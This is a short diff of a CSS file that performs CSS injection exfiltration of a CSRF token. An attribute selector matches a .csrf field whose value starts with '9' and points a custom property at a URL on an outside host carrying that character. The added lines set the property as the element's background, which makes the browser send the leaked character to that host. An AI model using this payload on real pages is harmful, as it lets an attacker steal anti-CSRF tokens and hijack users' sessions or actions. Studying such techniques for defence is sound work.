@@ -184,3 +184,7 @@
 .csrf[value^="9"] {
   --value: url(https://cssexfiltration.free.beeceptor.com/?value=9)
 }
+
+.csrf {
+  background: var(--value, none)
+}
